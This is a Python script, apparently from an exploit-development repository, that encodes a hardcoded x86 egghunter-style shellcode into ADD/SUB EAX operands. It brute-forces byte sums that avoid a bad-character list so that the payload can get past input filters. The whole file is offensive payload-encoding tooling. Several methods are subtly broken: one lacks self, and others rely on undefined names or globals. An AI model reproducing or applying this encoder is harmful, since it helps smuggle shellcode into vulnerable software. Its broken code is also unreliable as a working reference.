#!/usr/bin/python3

# ASE86 - An ADD/SUB Encoder for x86 shellcode
# By Michael W. Norris
# https://github.com/norrismw/exploit-dev/blob/master/ASEncoder86/ASE86.py

import argparse, struct, sys, random

class AddSubEncoder86: # subtract = True in the following example

    def __init__(self, bad_chars, shellcode): # initializes local variables
        self.bad_chars = bad_chars # bad bytes/characters
        self.shellcode = shellcode # shellcode to be encoded
        self.values = [v for v in range(256)] # all byte values
        self.all_bytes = b''.join([bytes([b]) for b in self.values]) # string of all bytes
        self.allowed_chars = [b for b in self.all_bytes if b not in self.bad_chars] # allowed bytes/characters

    def zero_register():
        while True:
            two_bytes = random.sample(allowed_chars, k=2)
            if two_bytes[0] & two_bytes[1] == 0:
                return two_bytes

    def chunk_shellcode(self): # divides shellcode into 4 byte chunks, padding with NOP (\x90) bytes if necessary
        if not len(self.shellcode) % 4 == 0: # if the length of the shellcode isn't evenly divisible by four
            for i in range(4 - ((len(shellcode) % 4))): # determines how many NOP bytes to add ...
                self.shellcode.append(144) #  e.g. if len(shellcode) is 31, then 4 - (31 % 4) = 1, so 1 NOP byte \x90 (144) will be appended to the shellcode
        return [self.shellcode[i:i+4] for i in range(0, len(self.shellcode), 4)] # divides shellcode into 4 byte chunks; e.g. if len(shellcode) is 8, [bytearray(b'\xe7\xff\xe7u'), bytearray(b'\xaf\xeau\xaf')]

    def gen_operand(self, four_bytes): # subtract = True; \xe7\xff\xe7\x75
        operand = [b for b in four_bytes] # \xe7\xff\xe7\x75 -> [231, 255, 231, 117]
        if subtract: # if subtract = True, use SUB EAX byte math instead of ADD EAX byte math
            input_one = 4294967294 # base 10 integer value of \xff\xff\xff\xfe
            input_two = struct.unpack('>I', bytearray(operand))[0] # base 10 integer value of bl; \xe7\xff\xe7\x75 -> 3892307829
            operand = [b for b in (input_one ^ input_two).to_bytes(4, 'big')] # \xff\xff\xff\xfe) XOR \xe7\xff\xe7\x75 = \x18\x00\x18\x8b -> [24, 0, 24, 139]
        return operand # returns operand list based on 'subtract' boolean; e.g. [231, 255, 231, 117] if subtract = False or [24, 0, 24, 139] if subtract = True

    def check_carry(self, four_bytes): # subtract = True; \x18\x00\x18\x8b = [24, 0, 24, 139]; subtract 1 (0x01) from the left when adding to/beyond 256 (0x0100)
        reverse = four_bytes[::-1] # reverses [24, 0, 24, 139] to [139, 24, 0, 24]; consider bytes in this order to account for cascading arithmetic
        for i in range(3): # accounts for [139, 24, 0] (no position to the left of the most significant '24' byte, so ignore)
            if reverse[i] < min(self.allowed_chars) * 3: # if true, must add to/beyond 256 (0x0100) to reach byte value; True for '0' (must add to 256) at index 2
                    reverse[i+1] -= 1 # subtracts 1 (0x01) from '24' at index 3 ([139, 24, 0, 23]) to account for the 0x0100 carry
        return reverse[::-1] # revert to original byte order [23, 0, 24, 139]

    def brute_addition(self, n): # finds three allowed bytes/character values that add to a bad byte/character value
        if n == 0: # can't add three numbers to 0 ...
            n += 256 # ... so add three numbers to 256; 0 + 256 = 0x0100, so normalize for carry
        elif n < min(self.allowed_chars) * 3: # can't add three numbers to n when n is less than three times the lowest value allowed character ...
            n += 256 # ... so add three numbers to n + 256; n + 256 = 0x010n, so normalize for carry
        while True: # never give up. never surrender.
            selected_bytes = random.choices(self.allowed_chars, k=3) # pick three bytes from allowed characters; allows for duplicate bytes to be selected
            if sum(selected_bytes) == n: # check if the three random allowed bytes add to n;
                return selected_bytes # return selected_bytes; e.g. n = 24, could return [9, 6, 9]

    def dword2int(self, dword): # converts byte values/lists such as [12, 91, 19, 86] to  207295318
        dword_int = struct.unpack('>I', bytearray(dword))[0] # if binary = False, format bytes for 'ADD EAX,04640106' or 'SUB EAX,04640106' style assembly instructions
        if binary: # if binary = True
            dword_int = struct.unpack('<I', bytearray(dword))[0] # format bytes for '05 06016404` or '2d 06016404' style binary edit/paste instructions
        return dword_int

    def four_hex(self, value): # converts integer to a 4 byte zero-padded hexadecimal number
        return '%0*x' % (8, value)


if __name__ == '__main__': # subtract = False in the following example
    subtract = False # True for SUB, False for ADD
    binary = True # formatted for 'ADD EAX,04640106' or 'SUB EAX,04640106' style assembly instructions

    bad_chars = bytearray(b'\x00\x0a\x0d\x2f\x3a\x3f\x40\x80\x81\x82\x83\x84\x85\x86\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xd5\xd6\xd7\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')
    shellcode = bytearray(b'\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7')

    encoder = AddSubEncoder86(bad_chars, shellcode)
    forward_chunks = encoder.chunk_shellcode() # breaks shellcode into chunks of 4; first 4 bytes are at index 0
    code_chunks = [chunk[::-1] for chunk in forward_chunks[::-1]] # e.g. forward_chunks[-1] is code_chunks[0], and forward_chunks[-1][-1] is code_chunks[0][0]
    raw_operands = [encoder.gen_operand(chunk) for chunk in code_chunks] # list of all operands generated by AddSubEncoder86.raw_operands()
    operands = [encoder.check_carry(raw_operands[i]) for i in range(len(raw_operands))] # list of all operands adjusted to account for adding to/beyond 256 (0x0100)

    for loop_num in range(len(code_chunks)): # iterates over each chunk of 4 byte shellcode; e.g. \xe7\xff\xe7\x75
        successes = [encoder.brute_addition(operands[loop_num][i]) for i in range(4)] # list of successful brute force addition combinations for bytes in chunk; e.g. [[15, 75, 27], [72, 76, 83], [104, 124, 127]
        bytevalues = []
        bytevalues.append([successes[b][0] for b in range(4)]) # byte value of first ADD operand; e.g. [15, 72, 104, 108]
        bytevalues.append([successes[b][1] for b in range(4)]) # byte value of second ADD operand; e.g. [75, 76, 124, 165]
        bytevalues.append([successes[b][2] for b in range(4)]) # byte value of third ADD operand; e.g. [27, 83, 27, 48]
        intvalues = [encoder.dword2int(bytevalue) for bytevalue in bytevalues] # e.g. [256403564, 1263303845, 458431280]
        print('%s\n%s\n%s\n' % (encoder.four_hex(intvalues[0]), encoder.four_hex(intvalues[1]), encoder.four_hex(intvalues[2]))) # e.g. ADD EAX,0f48686c#ADD EAX,4b4c7ca5#ADD EAX,1b531b30

    exit(0)
